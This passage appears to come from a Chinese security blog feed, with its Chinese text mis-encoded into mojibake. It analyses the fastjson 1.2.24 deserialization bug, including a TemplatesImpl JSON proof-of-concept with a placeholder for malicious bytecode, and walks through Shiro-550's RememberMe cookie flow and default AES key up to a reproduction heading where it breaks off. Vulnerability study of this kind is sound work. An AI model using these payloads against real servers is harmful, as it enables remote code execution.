title="æ³¨æ„1"></a>æ³¨æ„1</h5><p><code>BasicDataSource#getConnection</code>å…¥å£ç‚¹æ˜¯getterï¼Œæ‰€ä»¥éœ€è¦æ˜¯parseObject()</p><h5 id="é—®é¢˜1"><a href="#é—®é¢˜1" class="headerlink" title="é—®é¢˜1:"></a>é—®é¢˜1:</h5><p>å…¶å®ä¹Ÿå°è¯•äº†<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#setLogWriter</code>è¿™ä¸ªsetteræ–¹æ³•ï¼Œä½†å…¶ä¸­çš„å‚æ•°æ˜¯ä¸€ä¸ªç±»ï¼Œä¸”æ²¡æœ‰æ— å‚æ„é€ å™¨ï¼Œå°±å¯¼è‡´æ— æ³•ä¼ ï¼Œä¼ <code>null</code>ä¹Ÿä¸è¡Œ</p><h4 id="POC3"><a href="#POC3" class="headerlink" title="POC3"></a>POC3</h4><p>åœ¨CBé“¾ä¸­ï¼Œ<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>æœ‰è¿™ä¹ˆä¸€ä¸ªç±»ï¼Œè¯¥ç±»ä¸­æœ‰ä¸ª</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code>ï¼Œæ˜¯åœ¨CBé“¾ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯ä¸ªgetteræ–¹æ³•ï¼Œé€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œå¾—çŸ¥åœ¨parseæ—¶ï¼Œè°ƒç”¨getteræ–¹æ³•éœ€è¦æ»¡è¶³ä»¥ä¸‹ï¼š</p><ol><li>æ–¹æ³•åé•¿åº¦å¤§äº4</li><li>æ–¹æ³•åç¬¬4ä½æ˜¯å¤§å†™å­—æ¯</li><li>ä»¥getå¼€å¤´</li><li>publicä¿®é¥°</li><li>å‚æ•°å€¼ä¸ºç©º</li><li>è¿”å›ç±»å‹æ»¡è¶³ï¼š<code>Collection/Map/AtomicBoolean/AtomicIntegerAtomicLong</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Propertiesç»§æ‰¿HashTable,HashTableåˆå®ç°Mapæ¥å£</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> newTransformer().getOutputProperties();<br>    &#125;<br>   ...<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™ä¸ª<code>getOutputProperties</code>åœ¨parseæ—¶ä¹Ÿèƒ½å¤Ÿè°ƒç”¨ï¼Œå›å¿†ä¸€ä¸‹å‰é¢çš„æµç¨‹ï¼Œä»<code>getOutputProperties</code></p><blockquote><p>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</p><p>â€‹    com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</p><p>â€‹        com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</p><p>â€‹            com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</p><p>â€‹                com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader#defineClass</p></blockquote><p>æµç¨‹å¤§æ¦‚å°±æ˜¯è¿™ä¹ˆä¸ªæµç¨‹ï¼Œç„¶åæ¥ä¸‹æ¥å°±æ˜¯éœ€è¦å»ä¼ æ•°æ®äº†ï¼Œèµ°ä¸‹æµç¨‹ï¼Œçœ‹ä¸‹éœ€è¦å“ªäº›ä¸œè¥¿</p><p><img src="/2022/11/12/fastjson1.2.24/34.png"></p><p>å†å¾€ä¸‹ï¼š</p><p><img src="/2022/11/12/fastjson1.2.24/35.png"></p><p>ç„¶åå°±æ²¡å•¥äº†ï¼Œéœ€è¦æ›´æ”¹çš„å­—æ®µå°±åªæœ‰è¿™ä»¨äº†</p><p>æ¥ä¸‹æ¥å°±æ˜¯å†™POCäº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br>  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<br>  <span class="hljs-string">&quot;_name&quot;</span>: <span class="hljs-string">&quot;Mechoy&quot;</span>,<br>  <span class="hljs-string">&quot;_tfactory&quot;</span>: <span class="hljs-keyword">null</span>,<br>  <span class="hljs-string">&quot;_bytecodes&quot;</span>: [<br>    <span class="hljs-string">&quot;æ¶æ„ç±»çš„base64ç¼–ç &quot;</span><br>  ],<br>  <span class="hljs-string">&quot;OutputProperties&quot;</span>: <span class="hljs-keyword">null</span><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="é—®é¢˜1-1"><a href="#é—®é¢˜1-1" class="headerlink" title="é—®é¢˜1"></a>é—®é¢˜1</h5><p><code>_name</code>,<code>_bytecodes</code>,<code>_tfactory</code>è¿™å‡ ä¸ªå­—æ®µæ²¡æœ‰ç¬¦åˆæ¡ä»¶çš„setteræ–¹æ³•ï¼Œå¹¶ä¸”è¯¥å­—æ®µéƒ½æ˜¯ç§æœ‰çš„ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦åœ¨parseä¸­åŠ å…¥ï¼š<code>Feature.SupportNonPublicField</code>æ‰èƒ½å¤Ÿå®ç°æ§åˆ¶ç§æœ‰å±æ€§çš„å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">parse(s,Feature.SupportNonPublicField);<br>parseObject(s,Feature.SupportNonPublicField);<br></code></pre></td></tr></table></figure><h5 id="é—®é¢˜2"><a href="#é—®é¢˜2" class="headerlink" title="é—®é¢˜2"></a>é—®é¢˜2</h5><p>å…³äºä¼ å…¥æ•°æ®æ—¶ï¼Œ.classæ–‡ä»¶å¦‚ä½•çš„å­—ç¬¦æ•°ç»„å¦‚ä½•ä¼ </p><p>å½“Fastjsonåœ¨è§£æJSONå­—ç¬¦ä¸²æ—¶ï¼Œå¦‚æœé‡åˆ°å±æ€§å€¼æ˜¯Base64ç¼–ç çš„å­—ç¬¦ä¸²ï¼Œå®ƒä¼š<strong>è‡ªåŠ¨å°†å…¶è§£ç </strong>ä¸ºåŸå§‹çš„äºŒè¿›åˆ¶æ•°æ®ï¼Œç„¶åå°†å…¶èµ‹å€¼ç»™JavaBeançš„ç›¸åº”å±æ€§ã€‚</p><p><code>com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</code>åœ¨è¿™é‡Œè°ƒç”¨<code>lexer.bytesValue()</code>,å…¶ä¸­ä¼šå¯¹å±æ€§å€¼è¿›è¡ŒBase64è§£ç </p><h5 id="æ³¨æ„1-2"><a href="#æ³¨æ„1-2" class="headerlink" title="æ³¨æ„1"></a>æ³¨æ„1</h5><p>å¯¹äºä¸€äº›ç©ºå€¼ï¼Œåœ¨ä½¿ç”¨jsonä¼ è¾“çš„æ—¶å€™ï¼Œæœ€å¥½æ˜¯<code>&#123;&#125;</code>ï¼Œ<code>null</code>æˆ–è€…<code>&quot;null&quot;</code>æˆ–è€…â€â€ç­‰éƒ½æ˜¯åœ¨ç‰¹å®šæƒ…å†µä¸‹æ‰ä¼šå®ç°çš„</p><h3 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h3><p>fastjsonçš„ååºåˆ—åŒ–ï¼Œä¹ŸJavaåŸç”Ÿçš„ååºåˆ—åŒ–æ˜¯æœ‰è¾ƒå¤§çš„åŒºåˆ«çš„ï¼š</p><ol><li>å…¥å£ç‚¹ï¼ŒreadObject  â€”-&gt; setter</li><li>å‚æ•°çš„èµ‹å€¼ï¼Œç›´æ¥èµ‹å€¼ â€”-&gt; ä½¿ç”¨setterèµ‹å€¼æˆ–åå°„èµ‹å€¼</li><li>fastjsonååºåˆ—åŒ–éœ€è¦å¯¹åº”ç±»åˆæ— å‚æ„é€ å™¨ï¼ŒåŸç”Ÿä¸éœ€è¦</li></ol><p>ç›®å‰èƒ½æƒ³åˆ°çš„æš‚æ—¶å°±è¿™ä»¨ï¼Œåé¢æƒ³åˆ°äº†å†è¡¥å……ï¼Œæ¥ä¸‹æ¥å°±æ˜¯fastjsonçš„ç»•è¿‡äº†</p><h3 id="0x05-å‚è€ƒé“¾æ¥"><a href="#0x05-å‚è€ƒé“¾æ¥" class="headerlink" title="0x05 å‚è€ƒé“¾æ¥"></a>0x05 å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://www.w3cschool.cn/fastjson/fastjson-intro.html">Fastjson ä½¿ç”¨æŒ‡å—</a></li><li><a href="https://www.bilibili.com/video/BV1bD4y117Qh/?spm_id_from=333.999.0.0&vd_source=db93b94230228cb739b48f4f59e74abd">fastjsonååºåˆ—åŒ–æ¼æ´1-æµç¨‹åˆ†æ</a></li><li><a href="https://www.bilibili.com/video/BV1pP411N726/?spm_id_from=333.999.0.0&vd_source=db93b94230228cb739b48f4f59e74abd">fastjsonååºåˆ—åŒ–æ¼æ´2-1.2.24åˆ©ç”¨</a></li><li><a href="https://ciyfly.github.io/2020/12/16/%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90fastjson1-2-24/">å¤ç°åŠåˆ†æfastjson1.2.24</a></li><li><a href="https://blog.csdn.net/CHCH998/article/details/106665974/">åœ¨JSONä¸­è¡¨ç¤ºnull</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shiro550ååºåˆ—åŒ–</title>
    <link href="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h2 id="shiro550ååºåˆ—åŒ–"><a href="#shiro550ååºåˆ—åŒ–" class="headerlink" title="shiro550ååºåˆ—åŒ–"></a>shiro550ååºåˆ—åŒ–</h2><h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>èº²ä¸æ‰çš„shiroï¼Œé¿ä¸å¼€çš„fastJsonï¼Œä¸€ä¸ªä¸ªæ¥å§</p><p>Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§è€Œçµæ´»çš„Javaå®‰å…¨æ¡†æ¶ï¼Œç”¨äºèº«ä»½éªŒè¯ã€æˆæƒå’ŒåŠ å¯†ã€‚</p><p>ä»¥ä¸‹æ˜¯Apache Shiroçš„ä¸€äº›ä¸»è¦åŠŸèƒ½ï¼š</p><ol><li>è®¤è¯ï¼šShiroæä¾›äº†å¤šç§è®¤è¯æœºåˆ¶ï¼ŒåŒ…æ‹¬åŸºäºç”¨æˆ·åå’Œå¯†ç çš„è®¤è¯ã€åŸºäºSSLçš„è®¤è¯ã€åŸºäºLDAPçš„è®¤è¯ç­‰ï¼Œå¯ä»¥æ»¡è¶³ä¸åŒåº”ç”¨åœºæ™¯çš„éœ€æ±‚ã€‚</li><li>æˆæƒï¼šShiroæä¾›äº†ç»†ç²’åº¦çš„æˆæƒæœºåˆ¶ï¼Œå¯ä»¥å¯¹è®¿é—®èµ„æºçš„æƒé™è¿›è¡Œç²¾ç¡®çš„æ§åˆ¶ï¼Œæ”¯æŒåŸºäºè§’è‰²ã€æƒé™ã€èµ„æºç­‰å¤šç§æˆæƒæ–¹å¼ã€‚</li><li>åŠ å¯†ï¼šShiroæä¾›äº†å¤šç§åŠ å¯†ç®—æ³•ï¼ŒåŒ…æ‹¬MD5ã€SHA1ã€SHA256ç­‰ï¼Œå¯ä»¥å¯¹ç”¨æˆ·å¯†ç ç­‰æ•æ„Ÿä¿¡æ¯è¿›è¡Œå®‰å…¨åŠ å¯†ã€‚</li><li>ä¼šè¯ç®¡ç†ï¼šShiroæä¾›äº†ä¼šè¯ç®¡ç†åŠŸèƒ½ï¼Œå¯ä»¥ç®¡ç†ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä¼šè¯è¶…æ—¶ã€ä¼šè¯éªŒè¯ç­‰ï¼ŒåŒæ—¶æ”¯æŒé›†ç¾¤ç¯å¢ƒä¸‹çš„ä¼šè¯ç®¡ç†ã€‚</li><li>ç¼“å­˜ï¼šShiroæä¾›äº†ç¼“å­˜æœºåˆ¶ï¼Œå¯ä»¥ç¼“å­˜ç”¨æˆ·ä¿¡æ¯ã€è§’è‰²ä¿¡æ¯ã€æƒé™ä¿¡æ¯ç­‰ï¼Œæé«˜äº†åº”ç”¨ç¨‹åºçš„æ€§èƒ½ã€‚</li><li>Webé›†æˆï¼šShiroæä¾›äº†ä¸Servletã€Strutsã€Springç­‰æ¡†æ¶çš„é›†æˆæ”¯æŒï¼Œå¯ä»¥æ–¹ä¾¿åœ°åœ¨Webåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨ã€‚</li></ol><h3 id="0x01-ç¯å¢ƒæ­å»º"><a href="#0x01-ç¯å¢ƒæ­å»º" class="headerlink" title="0x01 ç¯å¢ƒæ­å»º"></a>0x01 ç¯å¢ƒæ­å»º</h3><p>ç¯å¢ƒæ­å»ºæ°¸è¿œæ˜¯æœ€éš¾çš„ï¼Œä»–å–µçš„ï¼ŒæŠ˜è…¾äº†ä¸€å¤©</p><h4 id="shiroç®€ä»‹"><a href="#shiroç®€ä»‹" class="headerlink" title="shiroç®€ä»‹"></a>shiroç®€ä»‹</h4><h4 id="æ‰€éœ€"><a href="#æ‰€éœ€" class="headerlink" title="æ‰€éœ€"></a>æ‰€éœ€</h4><ul><li><p><a href="https://github.com/apache/shiro/archive/refs/tags/shiro-root-1.2.4.zip">shiro1.2.4</a></p></li><li><p><a href="https://dlcdn.apache.org/tomcat/tomcat-8/v8.5.87/bin/apache-tomcat-8.5.87-windows-x64.zip">tomcat8.5.87</a></p></li></ul><h4 id="æ­å»º"><a href="#æ­å»º" class="headerlink" title="æ­å»º"></a>æ­å»º</h4><ol><li><p>ä¸‹è½½shiroã€è§£å‹åå¯¼å…¥IDEAï¼Œé€‰æ‹©shiroæ ¹ç›®å½•ä¸‹çš„pom.xml -&gt; ä½œä¸ºé¡¹ç›®æ‰“å¼€ -&gt; ä¿¡ä»»é¡¹ç›®</p></li><li><p>æ·»åŠ æˆ–æ›´æ”¹ä¾èµ–ï¼ˆå¯èƒ½ä¼šæœ‰é»˜è®¤ç‰ˆæœ¬ï¼Œæ”¹æˆå¦‚ä¸‹å°±okäº†ï¼‰ï¼Œåˆ·æ–°pom</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>è§£å†³æŸäº›<code>plugins</code>çˆ†çº¢ï¼Œå°†è¯¥éƒ¨åˆ†æ³¨é‡Šæ‰</p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png"></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png"></p></li><li><p>é…ç½®tomcatï¼Œå¤§è‡´æµç¨‹å¾ˆç®€å•ï¼Œéœ€è¦æ³¨æ„çš„çŸ¥è¯†waråŒ…åˆ«æé”™äº†</p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png"></p></li><li><p>å¯åŠ¨ï¼Œç™»å½•ä¸‹è¯•è¯•ï¼Œèƒ½å¤ŸæˆåŠŸç™»é™†å°±å·®ä¸å¤šäº†</p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png"></p></li></ol><h3 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02 æ¼æ´åˆ†æ"></a>0x02 æ¼æ´åˆ†æ</h3><p>æŒ‰ç…§ç½‘ä¸Šè¯´çš„ï¼šShiroæä¾›äº†RememberMeåŠŸèƒ½ï¼Œå®ƒå…è®¸ç”¨æˆ·åœ¨ä¸‹ä¸€æ¬¡ç™»å½•æ—¶ï¼Œæ— éœ€å†æ¬¡è¾“å…¥ç”¨æˆ·åå’Œå¯†ç å³å¯ç›´æ¥ç™»å½•ã€‚ä¹Ÿå°±æ˜¯ä¼šå‘å®¢æˆ·ç«¯è®¾ç½®ä¸€ä¸ªåä¸º<code>rememberMe</code>çš„cookieï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥æ— éœ€è´¦å·å¯†ç ç™»é™†ã€‚</p><p>rememberMeçš„å€¼ä¸ºï¼šç”¨æˆ·èº«ä»½å¯¹è±¡åºåˆ—åŒ–å­—ç¬¦ä¸²-&gt;AESåŠ å¯†-&gt;base64ç¼–ç </p><p>AESçš„keyå¯ä»¥ä¸ºé»˜è®¤å€¼æˆ–å¯ä»¥çˆ†ç ´å‡ºæ¥</p><p>ç„¶åæ­¤æ—¶å°±å¯ä»¥åå‘ï¼šæ¶æ„çš„åºåˆ—åŒ–å­—ç¬¦ä¸²-&gt;AESåŠ å¯†-&gt;base64ç¼–ç   â€“&gt; ä¼ å…¥shiro â€“&gt; è§£ç -&gt; è§£å¯†-&gt;ååºåˆ—åŒ–</p><p>å¤§æ¦‚æµç¨‹å¦‚ä¸Šï¼Œä¸‹é¢æ¥çœ‹ä¸€ä¸‹æ¼æ´åœ¨ä»£ç ä¸­çš„ä½“ç°</p><h4 id="ç™»é™†è®¤è¯æµç¨‹"><a href="#ç™»é™†è®¤è¯æµç¨‹" class="headerlink" title="ç™»é™†è®¤è¯æµç¨‹"></a>ç™»é™†è®¤è¯æµç¨‹</h4><p>RememberMeçš„è®¾ç½®æ˜¯åœ¨ç™»é™†å®Œæˆä¹‹åï¼Œæ‰€ä»¥å…ˆæ¥ç®€å•çœ‹ä¸€ä¸‹ç™»é™†è®¤è¯çš„è¿‡ç¨‹</p><p><code>org.apache.shiro.web.filter.authc.AuthenticatingFilter#executeLogin</code>ï¼Œå‰é¢éƒ½æ˜¯è¿‡æ»¤å™¨ï¼Œç›´æ¥ä»è¿™å¼€å§‹å§</p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png"></p><p><code>org.apache.shiro.subject.support.DelegatingSubject#login</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png"></p><p><code>org.apache.shiro.mgt.DefaultSecurityManager#login</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png"></p><p><code>org.apache.shiro.mgt.AuthenticatingSecurityManager#authenticate</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png"></p><p><code>org.apache.shiro.authc.AbstractAuthenticator#authenticate</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png"></p><p><code>org.apache.shiro.authc.pam.ModularRealmAuthenticator#doAuthenticate</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png"></p><p><code>org.apache.shiro.authc.pam.ModularRealmAuthenticator#doSingleRealmAuthentication</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png"></p><p>Â·<code>org.apache.shiro.realm.AuthenticatingRealm#getAuthenticationInfo</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png"></p><p><code>org.apache.shiro.realm.AuthenticatingRealm#assertCredentialsMatch</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/13.png"></p><p><code>org.apache.shiro.authc.credential.SimpleCredentialsMatcher#doCredentialsMatch</code></p><p>è·å–è¾“å…¥çš„å¯†ç ï¼Œå†æ ¹æ®è´¦å·è·å–æ­£ç¡®çš„å¯†ç ï¼Œequalsä¸€ä¸‹ï¼Œç›¸åŒå°±ç®—ç™»é™†æˆåŠŸï¼Œä¸ç›¸åŒè¿”å›ä¸ªfalseï¼Œç„¶åä¼šåœ¨æŸä¸ªä½ç½®æŠ›å‡ºä¸ªå¼‚å¸¸</p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/14.png"></p><p>ç„¶åä¸€ç›´è¿”å›åˆ°<code>org.apache.shiro.mgt.DefaultSecurityManager#login</code>ï¼Œåˆ°è¿™ç™»é™†è®¤è¯è¿‡ç¨‹ç®—æ˜¯ç»“æŸäº†ï¼Œæ¥ä¸‹æ¥RememberMeç”Ÿæˆè¿‡ç¨‹</p><h4 id="RememberMeç”Ÿæˆæµç¨‹"><a href="#RememberMeç”Ÿæˆæµç¨‹" class="headerlink" title="RememberMeç”Ÿæˆæµç¨‹"></a>RememberMeç”Ÿæˆæµç¨‹</h4><p><code>org.apache.shiro.mgt.DefaultSecurityManager#login</code>è¿˜æ˜¯ä»è¿™é‡Œå¼€å§‹ï¼Œæ¥åˆ°Line 285</p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/15.png"></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/16.png"></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/17.png"></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/18.png"></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#rememberIdentity</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/19.png"></p><p>è¿™ä¸¤ä¸ªå‡½æ•°éƒ½æœ‰ç‚¹å°é‡è¦ï¼Œæ‰€ä»¥ä¸€ä¸ªä¸ªæ¥çœ‹</p><ul><li><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#convertPrincipalsToBytes</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/20.png"></p><p>åºåˆ—åŒ–è¿™é‡Œï¼Œä½¿ç”¨çš„æ˜¯<code>org.apache.shiro.io.DefaultSerializer#serialize</code>ï¼Œä¹Ÿå°±æ˜¯åŸç”Ÿçš„åºåˆ—åŒ–ï¼Œæ‰€ä»¥åŸºæœ¬æ²¡å•¥çœ‹çš„</p><p>è´´ä¸ªå›¾å°±ç®—è¿‡å»äº†å§</p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/21.png"></p><p>è·Ÿè¿›åŠ å¯†éƒ¨åˆ†ï¼Œæ¥åˆ°<code>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/22.png"></p><p>çœ‹ä¸€ä¸‹è¿™ä¸ªkeyæ˜¯å¦‚ä½•æ¥çš„</p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/23.png" style="zoom:70%;"><p>ç®€å•ç‚¹è¯´ï¼Œæ˜¯ä¸€ä¸ªé»˜è®¤å€¼ï¼Œç»§ç»­è·Ÿè¿›</p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/24.png"></p><p><code>org.apache.shiro.crypto.JcaCipherService#encrypt(byte[], byte[], byte[], boolean)</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/25.png"></p><p>åˆ°è¿™å°±æ˜¯AESåŠ å¯†äº†ï¼Œå¦‚æœåƒæˆ‘ä¸€æ ·çœ‹ä¸å‡ºæ¥è¿™æ˜¯AESåŠ å¯†ï¼Œå¯ä»¥æ³¨æ„ä¸‹keyé™„è¿‘çš„æ³¨é‡Šï¼Œå†™äº†ğŸ«¡</p><p>ç„¶åå°±æ˜¯ä¸€è·¯è¿”å›ä¸€ä¸ªå­—èŠ‚æ•°ç»„äº†</p></li><li><p><code>org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity</code>ï¼Œåˆ°è¿™é‡Œå°±åŸºæœ¬ç»“æŸäº†</p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/26.png"></p></li></ul><h4 id="RememberMeè®¤è¯æµç¨‹"><a href="#RememberMeè®¤è¯æµç¨‹" class="headerlink" title="RememberMeè®¤è¯æµç¨‹"></a>RememberMeè®¤è¯æµç¨‹</h4><p>è¿™é‡Œæœ‰ä¸€ä¸ªå‘ç‚¹å°±æ˜¯ï¼ŒIDEAä¼šç”Ÿæˆä¸€ä¸ªJSESSIONIDï¼Œéœ€è¦å…ˆæŠŠå®ƒä»cookieé‡Œé¢åˆ é™¤æ‰ï¼Œæ‰ä¼šä½¿ç”¨åˆ°<code>rememberMe</code></p><p>è¿˜æ˜¯åˆšæ‰é‚£ä¸ªç±»ï¼Œæœ‰ç”Ÿæˆï¼Œå°±æœ‰è·å–ï¼Œæ¥çœ‹<code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/27.png"></p><p><code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/28.png"></p><p><code>org.apache.shiro.subject.PrincipalCollection</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/29.png"></p><p>è¿™é‡Œçš„è§£å¯†è‚¯å®šæ˜¯å’ŒåŠ å¯†ä¸€æ ·çš„ï¼Œåªä¸è¿‡å°±æ˜¯åè¿‡æ¥ï¼Œæ‰€ä»¥ä¹Ÿæ²¡ä»€ä¹ˆçœ‹çš„ï¼Œå†å°±æ˜¯åŸç”Ÿçš„ååºåˆ—åŒ–äº†ï¼Œè¿™ä¸ªä¹Ÿæ²¡å•¥çœ‹çš„</p><h4 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h4><p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œèƒ½å¤Ÿå¾—å‡ºåœ¨éªŒè¯RememberMeçš„æµç¨‹</p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/30.png"></p><ul><li>AESæ˜¯å¯¹ç§°åŠ å¯†ï¼ŒåŠ å¯†å’Œè§£å¯†å¯†åŒ™ç›¸åŒï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœå¯†åŒ™å·²çŸ¥ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¿½ç•¥è¿™å±‚åŠ å¯†</li><li>Base64è§£ç ï¼Œä¹Ÿå¿½ç•¥</li><li>åŸç”Ÿçš„ååºåˆ—åŒ–ï¼Œåªéœ€è¦æ‰¾åˆ°ä¸€æ¡é“¾å°±okäº†</li></ul><h3 id="0x03-å¤ç°"><a href="#0x03-å¤ç°" class="headerlink" title="0x03 å¤ç°"></a>0x03 